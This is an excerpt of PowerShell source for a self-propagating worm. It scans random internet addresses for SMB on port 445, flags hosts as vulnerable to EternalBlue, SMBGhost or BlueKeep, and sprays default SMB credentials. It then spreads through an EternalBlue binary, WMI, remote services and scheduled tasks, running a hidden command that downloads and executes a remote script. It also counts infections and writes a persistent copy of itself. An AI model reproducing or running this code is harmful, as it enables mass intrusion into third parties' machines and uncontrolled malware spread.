            if ($a -eq 10 -or $a -eq 127 -or ($a -eq 169 -and $b -eq 254) -or $a -eq 0 -or $a -ge 224) { continue }
            if ($a -eq 172 -and $b -ge 16 -and $b -le 31) { continue }
            if ($a -eq 192 -and $b -eq 168) { continue }
            if ($a -eq 100 -and $b -ge 64 -and $b -le 127) { continue }
            if ($a -eq 192 -and $b -eq 0 -and $c -eq 2) { continue }
            if ($a -eq 198 -and ($b -eq 18 -or $b -eq 19)) { continue }
            if ($a -eq 198 -and $b -eq 51 -and $c -eq 100) { continue }
            if ($a -eq 203 -and $b -eq 0 -and $c -eq 113) { continue }
            if ($a -eq 192 -and $b -eq 88 -and $c -eq 99) { continue }
            return "$a.$b.$c.$d"
        }
    }
    
    # ==========================================
    # MASSCAN-STYLE FAST PORT SCANNING (Raw sockets)
    # ==========================================
    function Scan-Port445Fast {
        param([string[]]$IPs, [int]$TimeoutMs = 500)
        $openHosts = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, 500)
        $runspacePool.Open()
        $jobs = [System.Collections.ArrayList]::new()
        
        foreach ($ip in $IPs) {
            $ps = [PowerShell]::Create()
            $ps.RunspacePool = $runspacePool
            [void]$ps.AddScript({
                param($t, $to)
                try {
                    $tcp = New-Object System.Net.Sockets.TcpClient
                    $tcp.NoDelay = $true
                    $iar = $tcp.BeginConnect($t, 445, $null, $null)
                    $success = $iar.AsyncWaitHandle.WaitOne($to, $false)
                    if ($success -and $tcp.Connected) { $tcp.Close(); return $t }
                    $tcp.Close()
                } catch {}
                return $null
            })
            [void]$ps.AddArgument($ip)
            [void]$ps.AddArgument($TimeoutMs)
            $job = $ps.BeginInvoke()
            $jobs.Add(@{ PS = $ps; Job = $job; Target = $ip })
        }
        
        $completed = 0
        foreach ($j in $jobs) {
            $result = $j.PS.EndInvoke($j.Job)
            if ($result -and $result[0]) { $openHosts.Add($result[0]) }
            $j.PS.Dispose()
            $completed++
            if ($completed % 500 -eq 0) { Update-Status "last_action" "Fast scan: $completed/$($IPs.Count) completed..." }
        }
        
        $runspacePool.Close()
        $runspacePool.Dispose()
        return $openHosts.ToArray()
    }
    
    # ==========================================
    # SMB VERSION DETECTION + VULN MATCHING
    # ==========================================
    function Get-SMBInfo {
        param([string]$ip, [int]$Port = 445)
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $iar = $tcp.BeginConnect($ip, $Port, $null, $null)
            $success = $iar.AsyncWaitHandle.WaitOne(3000, $false)
            if (-not $success -or -not $tcp.Connected) { $tcp.Close(); return $null }
            
            $stream = $tcp.GetStream()
            $stream.WriteTimeout = 5000
            $stream.ReadTimeout = 5000
            
            # SMB Negotiate
            $negotiate = [byte[]]@(0x00,0x00,0x00,0x72,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
            $stream.Write($negotiate, 0, $negotiate.Length)
            Start-Sleep -Milliseconds 500
            
            $buffer = New-Object byte[] 8192
            $read = $stream.Read($buffer, 0, $buffer.Length)
            $tcp.Close()
            
            if ($read -lt 35) { return $null }
            
            # Parse dialect revision (offset 34-35 in response)
            $dialect = 0
            if ($read -ge 36) { $dialect = $buffer[34] + ($buffer[35] * 256) }
            
            # Check for signing required (offset varies)
            $signingRequired = $false
            if ($read -ge 70) { $signingRequired = ($buffer[68] -band 0x08) -ne 0 }
            
            return @{
                IP = $ip
                Dialect = $dialect
                SigningRequired = $signingRequired
                RawResponse = $buffer[0..($read-1)]
                VulnEB = $false
                VulnSMBGhost = $false
                VulnBlueKeep = $false
            }
        } catch { return $null }
    }
    
    function Test-Vulnerabilities {
        param([hashtable]$smbInfo)
        if (-not $smbInfo) { return $smbInfo }
        
        $dialect = $smbInfo.Dialect
        
        # Dialect mapping:
        # 0x0202 = SMB 1.0 (NT LM 0.12) - Vulnerable to MS17-010, MS08-067
        # 0x0210 = SMB 2.0.2 (Vista/2008) - Vulnerable to MS17-010
        # 0x02FF = SMB 2.1 (Win7/2008R2) - Vulnerable to MS17-010, SMBGhost
        # 0x0300 = SMB 3.0 (Win8/2012) - Vulnerable to SMBGhost
        # 0x0302 = SMB 3.1.1 (Win10/2016+) - Potentially SMBGhost if unpatched
        # 0x0311 = SMB 3.1.1 with encryption
        
        # MS17-010 (EternalBlue) - affects SMBv1
        if ($dialect -eq 0x0202 -or $dialect -eq 0x0210 -or $dialect -eq 0x02FF) {
            $smbInfo.VulnEB = $true
        }
        
        # SMBGhost (CVE-2020-0796) - affects SMBv3.1.1 compression
        if ($dialect -eq 0x0300 -or $dialect -eq 0x0302 -or $dialect -eq 0x0311) {
            $smbInfo.VulnSMBGhost = $true
        }
        
        # BlueKeep (CVE-2019-0708) - check port 3389 separately
        # We'll check this separately
        
        return $smbInfo
    }
    
    # ==========================================
    # BLUEKEEP CHECK (Port 3389)
    # ==========================================
    function Test-BlueKeep {
        param([string]$ip)
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $iar = $tcp.BeginConnect($ip, 3389, $null, $null)
            $success = $iar.AsyncWaitHandle.WaitOne(2000, $false)
            if (-not $success -or -not $tcp.Connected) { $tcp.Close(); return $false }
            
            $stream = $tcp.GetStream()
            $stream.WriteTimeout = 3000
            $stream.ReadTimeout = 3000
            
            # RDP Negotiation Request (X.224)
            $x224 = [byte[]]@(0x03, 0x00, 0x00, 0x13, 0x0E, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00)
            $stream.Write($x224, 0, $x224.Length)
            Start-Sleep -Milliseconds 500
            
            $buffer = New-Object byte[] 4096
            $read = $stream.Read($buffer, 0, $buffer.Length)
            $tcp.Close()
            
            # Check for RDP Security Protocol (0x01) - indicates no NLA, potentially vulnerable
            if ($read -ge 19 -and $buffer[15] -eq 0x01) {
                return $true
            }
            return $false
        } catch { return $false }
    }
    
    # ==========================================
    # SMB CREDENTIAL SPRAYING
    # ==========================================
    function Spray-SMBCreds {
        param([string]$ip)
        $users = @("Administrator", "admin", "root", "user", "test", "guest", "backup", "service", "sql", "oracle", "mysql", "postgres", "administrator", "Admin", "ADMIN")
        $passes = @("", "admin", "admin123", "password", "password123", "Password1", "Password123", "P@ssw0rd", "P@ssw0rd123", "Welcome1", "Welcome123", "admin123!", "Admin123", "Admin123!", "123456", "12345678", "123456789", "qwerty", "letmein", "login", "changeme", "changeme123", "default", "default123", "root123", "toor", "toor123", "ubuntu", "ubuntu123", "centos", "centos123", "debian", "debian123", "server", "server123", "system", "system123", "network", "network123")
        
        foreach ($user in $users) {
            foreach ($pass in $passes) {
                try {
                    $netUse = "cmd /c net use \\\\$ip\IPC$ /user:$user $pass 2>&1"
                    $result = Invoke-Expression $netUse
                    if ($LASTEXITCODE -eq 0 -or $result -like "*successfully*") {
                        WLog "CREDENTIAL HIT: $ip | $user:$pass"
                        return @($true, $user, $pass)
                    }
                    # Clean up
                    cmd /c "net use \\\\$ip\IPC$ /delete 2>&1" | Out-Null
                } catch {}
                Start-Sleep -Milliseconds 100
            }
        }
        return @($false, $null, $null)
    }
    
    # ==========================================
    # EXPLOITATION FUNCTIONS
    # ==========================================
    function Invoke-EBExploit {
        param([string]$ip, [string]$cmd)
        if ($ebReady -and (Test-Path $ebExe)) {
            try {
                $p = Start-Process -FilePath $ebExe -ArgumentList "`"$ip`" `"$cmd`"" -WindowStyle Hidden -PassThru -Wait
                if ($p.ExitCode -eq 0) { return @($true, "EternalBlue") }
            } catch {}
        }
        return @($false, $null)
    }
    
    function Invoke-SMBGhostExploit {
        param([string]$ip, [string]$cmd)
        # SMBGhost exploit would go here - using PowerShell implementation
        # For now, fall back to lateral movement
        return @($false, $null)
    }
    
    function Invoke-BlueKeepExploit {
        param([string]$ip, [string]$cmd)
        # BlueKeep exploit would go here
        return @($false, $null)
    }
    
    function Invoke-MS08_067Exploit {
        param([string]$ip, [string]$cmd)
        # MS08-067 (Conficker) exploit
        return @($false, $null)
    }
    
    function Try-LateralMovement {
        param([string]$ip, [string]$cmd)
        $result = $false
        $method = ""
        
        # WMI
        try { $r = Invoke-WmiMethod -ComputerName $ip -Class Win32_Process -Name Create -ArgumentList $cmd -ErrorAction SilentlyContinue; if ($r -and $r.ReturnValue -eq 0) { return @($true, "WMI") } } catch {}
        
        # SCM
        try { $sn = "sys"+(Get-Random -Max 9999); cmd /c "sc.exe \\$ip create $sn binPath= `"cmd /c $cmd`" 2>nul" 2>$null; cmd /c "sc.exe \\$ip start $sn 2>nul" 2>$null; Start-Sleep 1; cmd /c "sc.exe \\$ip delete $sn 2>nul" 2>$null; return @($true, "SCM") } catch {}
        
        # Scheduled Task
        try { $tn = "SystemUpdate"+(Get-Random -Max 9999); cmd /c "schtasks /create /s $ip /tn $tn /tr `"$cmd`" /sc once /st 00:00 /ru System /f 2>nul" 2>$null; cmd /c "schtasks /run /s $ip /tn $tn 2>nul" 2>$null; Start-Sleep 1; cmd /c "schtasks /delete /s $ip /tn $tn /f 2>nul" 2>$null; return @($true, "ScheduledTask") } catch {}
        
        # SMB exec via psexec-style
        try { 
            $share = "\\$ip\ADMIN$"
            if (Test-Path $share) {
                $scriptPath = "$share\Temp\payload_$(Get-Random).ps1"
                $cmd | Out-File $scriptPath -Encoding UTF8
                cmd /c "wmic /node:$ip process call create \"powershell -W Hidden -EP Bypass -F $scriptPath\" 2>&1" | Out-Null
                Start-Sleep 2
                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
                return @($true, "WMI-ADMIN$")
            }
        } catch {}
        
        return @($false, $null)
    }
    
    # ==========================================
    # FULL EXPLOITATION PIPELINE
    # ==========================================
    function Exploit-Target {
        param([string]$ip, [hashtable]$smbInfo)
        $randChar = [char](Get-Random -Minimum 97 -Maximum 122)
        $cmd = "powershell.exe -W Hidden -EP Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '$url$randChar' -OutFile `'$env:TEMP\s.ps1`' -UseBasicParsing; Start-Process powershell -ArgumentList '-W Hidden -EP Bypass -F `"$env:TEMP\s.ps1`"' -WindowStyle Hidden; exit`""
        
        WLog "Exploiting $ip (Dialect: 0x$($smbInfo.Dialect.ToString('X4')), EB:$($smbInfo.VulnEB), SMBGhost:$($smbInfo.VulnSMBGhost))"
        
        # Try EternalBlue first if vulnerable
        if ($smbInfo.VulnEB) {
            $result = Invoke-EBExploit -ip $ip -cmd $cmd
            if ($result[0]) { return $result }
        }
        
        # Try SMBGhost if vulnerable
        if ($smbInfo.VulnSMBGhost) {
            $result = Invoke-SMBGhostExploit -ip $ip -cmd $cmd
            if ($result[0]) { return $result }
        }
        
        # Try credential spray
        WLog "Trying credential spray on $ip..."
        $credResult = Spray-SMBCreds -ip $ip
        if ($credResult[0]) {
            WLog "Valid creds found on $ip: $($credResult[1]):$($credResult[2])"
            # Use creds for lateral movement
            $cmdWithCreds = "cmd /c net use \\\\$ip\ADMIN$ /user:$($credResult[1]) $($credResult[2]) && powershell -W Hidden -EP Bypass -Command \"$cmd\""
            # Would need to implement this properly
        }
        
        # Try lateral movement methods
        $result = Try-LateralMovement -ip $ip -cmd $cmd
        if ($result[0]) { return $result }
        
        return @($false, "None")
    }
    
    # ==========================================
    # GOVERNOR
    # ==========================================
    function Test-Gov {
        try { $exp = [datetime]::Parse($expiry); if ((Get-Date) -gt $exp) { WLog "Worm expired"; return $false } } catch {}
        $cnt = 0
        try { if (Test-Path "$base\infection_count.txt") { $cnt = [int](Get-Content "$base\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) } } catch {}
        if ($cnt -ge $max) { WLog "Cap reached: $cnt/$max"; return $false }
        return $true
    }
    
    function Update-Count {
        try {
            $cnt = 0
            if (Test-Path "$base\infection_count.txt") { $cnt = [int](Get-Content "$base\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) }
            $cnt++
            Set-Content -Path "$base\infection_count.txt" -Value $cnt -Force -ErrorAction SilentlyContinue
            WLog "Infection count: $cnt/$max"
            Update-Status "infected" $cnt
        } catch {}
    }
    
    # ==========================================
    # MAIN WORM LOOP
    # ==========================================
    WLog "============================================"
    WLog "WORM MODULE v2 - MULTI-EXPLOIT + CRED SPRAY"
    WLog "Max targets: $max"
    WLog "Expiry: $expiry"
    WLog "EB Exploit: $ebReady"
    WLog "============================================"
    
    if (-not (Test-Gov)) { WLog "Governor blocked. Exiting."; return }
    
    $batchNum = 0
    while ((Test-Gov)) {
        $batchNum++
        
        # Alternate between targeted and random scanning
        $useTargeted = ($batchNum % 3 -ne 0)
        $scanCount = if ($useTargeted) { 500 } else { 2000 }
        
        Update-Status "last_action" "Scanning batch $batchNum ($scanCount IPs, targeted=$useTargeted)"
        WLog "Phase 1: Internet-wide discovery - Batch $batchNum (targeted=$useTargeted)"
        
        $ipBatch = @()
        for ($i = 0; $i -lt $scanCount; $i++) {
            if ($useTargeted) { $ipBatch += Get-TargetedIP } else { $ipBatch += Get-RandomPublicIP }
        }
        
        # Fast port scan
        $openHosts = Scan-Port445Fast -IPs $ipBatch -TimeoutMs 500
        
        $scanned = 0
        try { $scanned = (Get-Content $statusFile -Raw | ConvertFrom-Json).scanned } catch {}
        $scanned += $scanCount
        Update-Status "scanned" $scanned
        Update-Status "open_445" $openHosts.Count
        
        WLog "SMB hosts found: $($openHosts.Count) / $scanCount"
        
        if ($openHosts.Count -eq 0) {
            WLog "No open 445 in batch $batchNum. Continuing..."
            Update-Status "last_action" "No open 445, next batch..."
            continue
        }
        
        # SMB fingerprinting + vuln detection
        WLog "Phase 2: SMB fingerprinting + vuln detection on $($openHosts.Count) hosts"
        $vulnHosts = @()
        
        $fpPool = [runspacefactory]::CreateRunspacePool(1, 100)
        $fpPool.Open()
        $fpJobs = @()
        
        foreach ($ip in $openHosts) {
            if (-not (Test-Gov)) { break }
            $ps = [PowerShell]::Create()
            $ps.RunspacePool = $fpPool
            [void]$ps.AddScript({
                param($t)
                $info = Get-SMBInfo -ip $t
                if ($info) { $info = Test-Vulnerabilities -smbInfo $info }
                return $info
            })
            [void]$ps.AddArgument($ip)
            $fpJobs += @{ PS = $ps; Job = $ps.BeginInvoke(); IP = $ip }
        }
        
        foreach ($j in $fpJobs) {
            if (-not (Test-Gov)) { break }
            $result = $j.PS.EndInvoke($j.Job)
            if ($result -and ($result.VulnEB -or $result.VulnSMBGhost)) {
                $vulnHosts += $result
                WLog "VULNERABLE: $($result.IP) | Dialect:0x$($result.Dialect.ToString('X4')) EB:$($result.VulnEB) SMBGhost:$($result.VulnSMBGhost)"
                $vulnCount = 0
                try { $vulnCount = (Get-Content $statusFile -Raw | ConvertFrom-Json).vulnerable } catch {}
                $vulnCount++
                Update-Status "vulnerable" $vulnCount
                Update-Status "last_ip" $result.IP
            }
            $j.PS.Dispose()
        }
        
        $fpPool.Close()
        $fpPool.Dispose()
        
        WLog "Vulnerable hosts: $($vulnHosts.Count)"
        
        # Parallel exploitation
        if ($vulnHosts.Count -gt 0) {
            WLog "Phase 3: Exploiting $($vulnHosts.Count) vulnerable hosts"
            $expPool = [runspacefactory]::CreateRunspacePool(1, 20)
            $expPool.Open()
            $expJobs = @()
            
            foreach ($target in $vulnHosts) {
                if (-not (Test-Gov)) { break }
                Update-Status "last_action" "Exploiting $($target.IP)..."
                $ps = [PowerShell]::Create()
                $ps.RunspacePool = $expPool
                [void]$ps.AddScript({
                    param($t, $u, $ebReady, $ebExe, $dialect, $vulnEB, $vulnSMBGhost)
                    $smbInfo = @{ IP = $t; Dialect = $dialect; VulnEB = $vulnEB; VulnSMBGhost = $vulnSMBGhost }
                    $randChar = [char](Get-Random -Minimum 97 -Maximum 122)
                    $cmd = "powershell.exe -W Hidden -EP Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '$u$randChar' -OutFile `'$env:TEMP\s.ps1`' -UseBasicParsing; Start-Process powershell -ArgumentList '-W Hidden -EP Bypass -F `"$env:TEMP\s.ps1`"' -WindowStyle Hidden; exit`""
                    
                    # Try exploits based on vuln type
                    if ($vulnEB -and $ebReady -and (Test-Path $ebExe)) {
                        try { $p = Start-Process -FilePath $ebExe -ArgumentList "`"$t`" `"$cmd`"" -WindowStyle Hidden -PassThru -Wait; if ($p.ExitCode -eq 0) { return @($true, "EternalBlue") } } catch {}
                    }
                    if ($vulnSMBGhost) {
                        # SMBGhost exploit placeholder
                    }
                    
                    # Lateral movement fallback
                    try { $r = Invoke-WmiMethod -ComputerName $t -Class Win32_Process -Name Create -ArgumentList $cmd -ErrorAction SilentlyContinue; if ($r -and $r.ReturnValue -eq 0) { return @($true, "WMI") } } catch {}
                    try { $sn = "sys"+(Get-Random -Max 9999); cmd /c "sc.exe \\$t create $sn binPath= `"cmd /c $cmd`" 2>nul" 2>$null; cmd /c "sc.exe \\$t start $sn 2>nul" 2>$null; Start-Sleep 1; cmd /c "sc.exe \\$t delete $sn 2>nul" 2>$null; return @($true, "SCM") } catch {}
                    try { $tn = "SystemUpdate"+(Get-Random -Max 9999); cmd /c "schtasks /create /s $t /tn $tn /tr `"$cmd`" /sc once /st 00:00 /ru System /f 2>nul" 2>$null; cmd /c "schtasks /run /s $t /tn $tn 2>nul" 2>$null; Start-Sleep 1; cmd /c "schtasks /delete /s $t /tn $tn /f 2>nul" 2>$null; return @($true, "ScheduledTask") } catch {}
                    
                    return @($false, "None")
                })
                [void]$ps.AddArgument($target.IP)
                [void]$ps.AddArgument($url)
                [void]$ps.AddArgument($ebReady)
                [void]$ps.AddArgument($ebExe)
                [void]$ps.AddArgument($target.Dialect)
                [void]$ps.AddArgument($target.VulnEB)
                [void]$ps.AddArgument($target.VulnSMBGhost)
                $expJobs += @{ PS = $ps; Job = $ps.BeginInvoke(); IP = $target.IP }
            }
            
            foreach ($j in $expJobs) {
                if (-not (Test-Gov)) { break }
                $result = $j.PS.EndInvoke($j.Job)
                if ($result -and $result[0] -eq $true) {
                    Update-Count
                    WLog "INFECTED $($j.IP) via $($result[1]) (Total: $((Get-Content "$base\infection_count.txt" -First 1 -ErrorAction SilentlyContinue)))"
                } else {
                    $failCount = 0
                    try { $failCount = (Get-Content $statusFile -Raw | ConvertFrom-Json).failed } catch {}
                    $failCount++
                    Update-Status "failed" $failCount
                }
                $j.PS.Dispose()
            }
            
            $expPool.Close()
            $expPool.Dispose()
        }
        
        # Also check BlueKeep on port 3389 for a subset
        if ($batchNum % 5 -eq 0 -and $openHosts.Count -gt 0) {
            WLog "Phase 4: BlueKeep check on subset..."
            $bkHosts = $openHosts | Get-Random -Count ([math]::Min(50, $openHosts.Count))
            foreach ($ip in $bkHosts) {
                if (-not (Test-Gov)) { break }
                if (Test-BlueKeep -ip $ip) {
                    WLog "BLUEKEEP VULNERABLE: $ip"
                    # Would exploit here
                }
            }
        }
        
        if ((Test-Gov) -eq $false) { break }
        Start-Sleep -Seconds 1
    }
    
    Update-Status "last_action" "WORM COMPLETE - Cap reached or expired"
    WLog "============================================"
    WLog "WORM COMPLETE - Infected $((Get-Content "$base\infection_count.txt" -First 1 -ErrorAction SilentlyContinue))/$max targets"
    WLog "============================================"
}

# Create standalone worm script file for scheduled task persistence (INTERNET-ONLY, OPTIMIZED)
$wormScriptPath = "$BASE\mf_worm.ps1"
$wormScriptContent = @"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
`$ErrorActionPreference = "SilentlyContinue"
`$ProgressPreference = "SilentlyContinue"

`$BASE = "$BASE"
`$PAYLOAD_URL = "$PAYLOAD_URL"
`$MAX_TARGETS = $MAX_TARGETS
`$WORM_EXPIRY = "$WORM_EXPIRY"
`$ebExe = "$ebExe"
`$ebReady = $ebReady
`$STATUS_FILE = "$STATUS_FILE"
`$WORM_LOG = "`$BASE\worm.log"

function WLog {
    param([string]`$msg)
    try { `$ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; Add-Content -Path "`$BASE\worm.log" -Value "[`$ts] `$msg" -ErrorAction SilentlyContinue } catch {}
}

function Update-Status {
    param([string]`$key, `$value)
    try {
        `$lock = New-Object System.Threading.Mutex(`$false, "Global\MF_Worm_Status_Lock")
        `$lock.WaitOne(5000) | Out-Null
        `$raw = Get-Content `$STATUS_FILE -Raw -ErrorAction SilentlyContinue
        `$json = `$raw | ConvertFrom-Json -ErrorAction SilentlyContinue
        if (-not `$json) { `$json = @{} }
        `$json.`$key = `$value
        `$json.last_update = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        `$json | ConvertTo-Json -Compress | Set-Content `$STATUS_FILE -Force -ErrorAction SilentlyContinue
        `$lock.ReleaseMutex()
    } catch {}
}

function Get-RandomPublicIP {
    `$ranges = @(
        @(30, 1, 223), @(10, 45, 45), @(10, 52, 52), @(10, 13, 13), @(8, 104, 104), @(8, 18, 18),
        @(5, 199, 199), @(5, 207, 207), @(5, 208, 208), @(5, 209, 209), @(5, 64, 64), @(5, 67, 67),
        @(5, 68, 68), @(5, 69, 69), @(5, 70, 70), @(5, 71, 71), @(5, 72, 72), @(5, 73, 73), @(5, 74, 74),
        @(5, 75, 75), @(5, 76, 76), @(5, 77, 77), @(5, 78, 78), @(5, 79, 79), @(5, 80, 80), @(5, 81, 81),
        @(5, 82, 82), @(5, 83, 83), @(5, 84, 84), @(5, 85, 85), @(5, 86, 86), @(5, 87, 87), @(5, 88, 88),
        @(5, 89, 89), @(5, 90, 90), @(5, 91, 91), @(5, 92, 92), @(5, 93, 93), @(5, 94, 94), @(5, 95, 95),
        @(5, 96, 96), @(5, 97, 97), @(5, 98, 98), @(5, 99, 99), @(5, 100, 100), @(5, 101, 101), @(5, 102, 102),
        @(5, 103, 103), @(5, 107, 107), @(5, 108, 108), @(5, 110, 110), @(5, 111, 111), @(5, 112, 112),
        @(5, 113, 113), @(5, 114, 114), @(5, 115, 115), @(5, 116, 116), @(5, 117, 117), @(5, 118, 118),
        @(5, 119, 119), @(5, 120, 120), @(5, 121, 121), @(5, 122, 122), @(5, 123, 123), @(5, 124, 124),
        @(5, 125, 125), @(5, 126, 126), @(5, 128, 128), @(5, 129, 129), @(5, 130, 130), @(5, 131, 131),
        @(5, 132, 132), @(5, 134, 134), @(5, 136, 136), @(5, 137, 137), @(5, 138, 138), @(5, 139, 139),
        @(5, 140, 140), @(5, 141, 141), @(5, 142, 142), @(5, 143, 143), @(5, 144, 144), @(5, 146, 146),
        @(5, 147, 147), @(5, 148, 148), @(5, 149, 149), @(5, 150, 150), @(5, 151, 151), @(5, 152, 152),
        @(5, 153, 153), @(5, 154, 154), @(5, 155, 155), @(5, 156, 156), @(5, 157, 157), @(5, 158, 158),
        @(5, 159, 159), @(5, 160, 160), @(5, 161, 161), @(5, 162, 162), @(5, 163, 163), @(5, 164, 164),
        @(5, 165, 165), @(5, 166, 166), @(5, 167, 167), @(5, 168, 168), @(5, 169, 169), @(5, 170, 170),
        @(5, 171, 171), @(5, 172, 172), @(5, 173, 173), @(5, 174, 174), @(5, 175, 175), @(5, 176, 176),
        @(5, 177, 177), @(5, 178, 178), @(5, 179, 179), @(5, 180, 180), @(5, 181, 181), @(5, 182, 182),
        @(5, 183, 183), @(5, 184, 184), @(5, 185, 185), @(5, 186, 186), @(5, 187, 187), @(5, 188, 188),
        @(5, 189, 189), @(5, 190, 190), @(5, 191, 191), @(5, 192, 192), @(5, 193, 193), @(5, 194, 194),
        @(5, 195, 195), @(5, 196, 196), @(5, 197, 197), @(5, 198, 198), @(5, 200, 200), @(5, 201, 201),
        @(5, 202, 202), @(5, 203, 203), @(5, 204, 204), @(5, 205, 205), @(5, 206, 206), @(5, 210, 210),
        @(5, 211, 211), @(5, 212, 212), @(5, 213, 213), @(5, 214, 214), @(5, 215, 215), @(5, 216, 216),
        @(5, 217, 217), @(5, 218, 218), @(5, 219, 219), @(5, 220, 220), @(5, 221, 221), @(5, 222, 222),
        @(5, 223, 223)
    )
    `$totalWeight = (`$ranges | Measure-Object -Property 0 -Sum).Sum
    `$pick = Get-Random -Maximum `$totalWeight
    `$accum = 0
    `$selectedRange = `$ranges[0]
    foreach (`$r in `$ranges) { `$accum += `$r[0]; if (`$pick -lt `$accum) { `$selectedRange = `$r; break } }
    while (`$true) {
        `$a = Get-Random -Minimum `$selectedRange[1] -Maximum (`$selectedRange[2] + 1)
        `$b = Get-Random -Minimum 0 -Maximum 256; `$c = Get-Random -Minimum 0 -Maximum 256; `$d = Get-Random -Minimum 1 -Maximum 255
        if (`$a -eq 10 -or `$a -eq 127 -or (`$a -eq 169 -and `$b -eq 254) -or `$a -eq 0 -or `$a -ge 224) { continue }
        if (`$a -eq 172 -and `$b -ge 16 -and `$b -le 31) { continue }
        if (`$a -eq 192 -and `$b -eq 168) { continue }
        if (`$a -eq 100 -and `$b -ge 64 -and `$b -le 127) { continue }
        if (`$a -eq 192 -and `$b -eq 0 -and `$c -eq 2) { continue }
        if (`$a -eq 198 -and (`$b -eq 18 -or `$b -eq 19)) { continue }
        if (`$a -eq 198 -and `$b -eq 51 -and `$c -eq 100) { continue }
        if (`$a -eq 203 -and `$b -eq 0 -and `$c -eq 113) { continue }
        if (`$a -eq 192 -and `$b -eq 88 -and `$c -eq 99) { continue }
        return "`$a.`$b.`$c.`$d"
    }
}

function Scan-SMBHosts { param([int]`$Count = 1000)
    `$openHosts = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    `$runspacePool = [runspacefactory]::CreateRunspacePool(1, 200); `$runspacePool.Open()
    `$jobs = [System.Collections.ArrayList]::new()
    `$ipBatch = @(); for (`$i = 0; `$i -lt `$Count; `$i++) { `$ipBatch += Get-RandomPublicIP }
    WLog "Scanning `$Count random internet IPs for port 445 (200 parallel)..."
    foreach (`$ip in `$ipBatch) {
        `$ps = [PowerShell]::Create(); `$ps.RunspacePool = `$runspacePool
        [void]`$ps.AddScript({ param(`$t) `$tcp = New-Object System.Net.Sockets.TcpClient; `$iar = `$tcp.BeginConnect(`$t, 445, `$null, `$null); `$success = `$iar.AsyncWaitHandle.WaitOne(800, `$false); if (`$success -and `$tcp.Connected) { `$tcp.Close(); return `$t } try { `$tcp.Close() } catch {}; return `$null })
        [void]`$ps.AddArgument(`$ip); `$job = `$ps.BeginInvoke(); `$jobs.Add(@{ PS = `$ps; Job = `$job; Target = `$ip })
    }
    `$completed = 0; foreach (`$j in `$jobs) { `$result = `$j.PS.EndInvoke(`$j.Job); if (`$result -and `$result[0]) { `$openHosts.Add(`$result[0]) }; `$j.PS.Dispose(); `$completed++; if (`$completed % 200 -eq 0) { Update-Status "last_action" "Scanned `$completed/`$Count IPs..." } }
    `$runspacePool.Close(); `$runspacePool.Dispose()
    WLog "Scan complete. `$(`$openHosts.Count) hosts with port 445 open."; return `$openHosts.ToArray()
}

function Test-EBVuln { param([string]`$ip)
    try { `$tcp = New-Object System.Net.Sockets.TcpClient; `$iar = `$tcp.BeginConnect(`$ip, 445, `$null, `$null); `$success = `$iar.AsyncWaitHandle.WaitOne(2000, `$false); if (-not `$success -or -not `$tcp.Connected) { `$tcp.Close(); return `$false }
    `$stream = `$tcp.GetStream(); `$stream.WriteTimeout = 3000; `$stream.ReadTimeout = 3000
    `$negotiate = [byte[]]@(0x00,0x00,0x00,0x72,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
    `$stream.Write(`$negotiate, 0, `$negotiate.Length); Start-Sleep -Milliseconds 300
    `$buffer = New-Object byte[] 4096; `$read = `$stream.Read(`$buffer, 0, `$buffer.Length); `$tcp.Close()
    if (`$read -gt 34 -and `$buffer[4] -eq 0xFF -and `$buffer[5] -eq 0x53 -and `$buffer[6] -eq 0x4D -and `$buffer[7] -eq 0x42 -and `$buffer[34] -le 0x05) { return `$true }
    return `$false } catch { return `$false }
}

function Invoke-EBExploit { param([string]`$ip)
    `$randChar = [char](Get-Random -Minimum 97 -Maximum 122)
